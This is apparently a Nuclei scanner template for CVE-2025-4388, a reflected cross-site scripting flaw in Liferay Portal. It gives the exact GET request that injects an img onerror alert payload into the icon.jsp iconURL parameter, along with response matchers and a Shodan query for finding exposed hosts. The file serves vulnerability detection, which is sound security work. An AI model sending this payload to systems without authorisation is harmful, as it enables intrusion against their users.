id: CVE-2025-4388

info:
  name: Liferay Portal 'marketplace-app-manager-web' - Reflected XSS
  author: iamnoooob,rootxharsh,pdresearch
  severity: medium
  description: |
    A reflected cross-site scripting (XSS) vulnerability in the Liferay Portal 7.4.0 through 7.4.3.131, and Liferay DXP 2024.Q4.0 through 2024.Q4.5, 2024.Q3.1 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.12, 7.4 GA through update 92 allows an remote non-authenticated attacker to inject JavaScript into the modules/apps/marketplace/marketplace-app-manager-web.
  reference:
    - https://liferay.dev/portal/security/known-vulnerabilities/-/asset_publisher/jekt/content/CVE-2025-4388
  classification:
    epss-score: 0.00047
    epss-percentile: 0.14324
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"liferayPortalCSS"
  tags: cve,cve2025,liferay,marketplace,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/o/marketplace-app-manager-web/icon.jsp?iconURL=https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'search-container-icon sticker sticker-secondary'
          - '<img src=x onerror=alert(document.domain)>'
        condition: and

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100ccfdd79eedf51912d6380ef3c5701a1cc298502b609e69383614fd12cf678f2d022100c945b2b5a75b744f18d721a1e7a691bbfc6a2e1b837d7bf7bc56c263b04c3e5a:922c64590222798bb761d5b6d8e72950